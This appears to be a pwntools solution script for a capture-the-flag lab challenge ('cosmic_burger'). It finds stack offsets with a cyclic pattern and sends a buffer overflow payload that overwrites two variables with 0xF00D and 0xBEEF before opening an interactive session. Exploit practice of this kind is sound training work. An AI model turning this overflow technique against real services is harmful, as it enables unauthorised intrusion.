from pwn import *

ADDR = "offsec.m0lecon.it"
port = 13517

elf = ELF('/home/kali/Desktop/offsec/labs/lab1/materiale/challenges/05-cosmic-burger/cosmic_burger')

context.binary = elf
context.arch = "amd64"
context.os = "linux"

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(ADDR, port)

    return r

def get_offsets():
    # Start a dummy process to crash
    p_crash = process(elf.path)
    
    p_crash.recvuntil(b"What's your order?\n")
    p_crash.sendline(cyclic(200))
    values = p_crash.recvuntil(b"Try again!").split(b"That's not the right combo. Try again!")[0].strip()
    sauce_val = int(values.split(b"|")[0].strip().split(b"sauce: ")[1], 16)
    cheese_val = int(values.split(b"|")[1].strip().split(b"cheese: ")[1], 16)
 
    offset_sauce = cyclic_find(sauce_val)
    offset_cheese = cyclic_find(cheese_val)

    return (offset_sauce, offset_cheese)

sauce_off, cheese_off = get_offsets()
print(sauce_off)    #44
print(cheese_off)   #40

r = conn()

sauce_target = 0xBEEF
cheese_target = 0xF00D

payload = flat(
    b"A" * cheese_off,
    p32(cheese_target), 
    p32(sauce_target)
)

r.recvuntil(b"What's your order?\n")
r.sendline(payload)
r.interactive()